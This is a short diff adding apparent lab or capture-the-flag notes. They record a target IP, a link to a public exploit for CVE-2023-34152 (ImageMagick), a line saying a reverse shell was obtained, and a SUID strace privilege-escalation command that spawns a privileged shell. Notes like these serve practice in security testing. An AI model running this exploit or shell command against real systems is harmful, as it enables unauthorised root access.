@@ -1,0 +1,9 @@
+Image
+
+192.168.184.178
+
+
+https://github.com/SudoIndividual/CVE-2023-34152/blob/main/CVE-2023-34152.py
+Got reverse shell
+
+strace -o /dev/null /bin/sh -p
